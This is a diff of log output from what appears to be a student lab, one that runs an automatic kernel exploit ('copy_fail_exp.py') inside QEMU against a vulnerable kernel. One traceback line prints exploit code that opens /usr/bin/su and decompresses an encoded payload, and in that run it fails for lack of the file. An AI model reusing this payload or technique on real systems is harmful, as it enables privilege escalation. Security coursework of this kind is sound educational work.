@@ -1,5 +1,5 @@
 === HITO 2: EXPLOIT AUTOMÁTICO ===
-Fecha: Mon May 18 02:12:19 UTC 2026
+Fecha: Mon May 18 02:18:48 UTC 2026
 STUDENT_ID: Matias-Quinteros
 Kernel: bzImage_vuln
 
@@ -12,10 +12,7 @@ Press Ctrl-B to configure iPXE (PCI 00:03.0)...
 
 
 Booting from ROM...
-c[?7l[2Jdent/copy_fail_exp.py
-id
-exit
-[INIT] /proc mount status:
+c[?7l[2J[INIT] /proc mount status:
 none on /proc type proc (rw,relatime)
 [INIT] /proc content sample:
 1
@@ -51,45 +48,11 @@ none /tmp tmpfs rw,relatime 0 0
   ║   6.12.0               ║
   ╚══════════════════════════════════════════╝
 
-Could not find platform independent libraries <prefix>
-Could not find platform dependent libraries <exec_prefix>
-Python path configuration:
-  PYTHONHOME = (not set)
-  PYTHONPATH = (not set)
-  program name = 'python3'
-  isolated = 0
-  environment = 1
-  user site = 1
-  safe_path = 0
-  import site = 1
-  is in build tree = 0
-  stdlib dir = '/usr/lib/python3.12'
-  sys._base_executable = ''
-  sys.base_prefix = '/usr'
-  sys.base_exec_prefix = '/usr'
-  sys.platlibdir = 'lib'
-  sys.executable = ''
-  sys.prefix = '/usr'
-  sys.exec_prefix = '/usr'
-  sys.path = [
-    '/usr/lib/python312.zip',
-    '/usr/lib/python3.12',
-    '/usr/lib/python3.12/lib-dynload',
-  ]
-Fatal Python error: init_fs_encoding: failed to get the Python codec of the filesystem encoding
-Python runtime state: core initialized
-ModuleNotFoundError: No module named 'encodings'
-
-Current thread 0x00007f80bfb83080 (most recent call first):
-  <no Python frame>
+Traceback (most recent call last):
+  File "/home/student/copy_fail_exp.py", line 8, in <module>
+    f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+      ^^^^^^^^^^^^^^^^^^^^^^^
+FileNotFoundError: [Errno 2] No such file or directory: '/usr/bin/su'
 EXPLOIT_DONE
 /bin/sh: can't access tty; job control turned off
-/ $ dent/copy_fail_exp.py
-/bin/sh: dent/copy_fail_exp.py: not found
-/ $ id
-uid=1001(student) gid=1001(student) groups=1001(student)
-/ $ exit
-Kernel panic - not syncing: Attempted to kill init! exitcode=0x00000000
-Kernel Offset: disabled
----[ end Kernel panic - not syncing: Attempted to kill init! exitcode=0x00000000 ]---
-qemu-system-x86_64: terminating on signal 15 from pid 48850 (timeout)
+/ $ qemu-system-x86_64: terminating on signal 15 from pid 69482 (timeout)
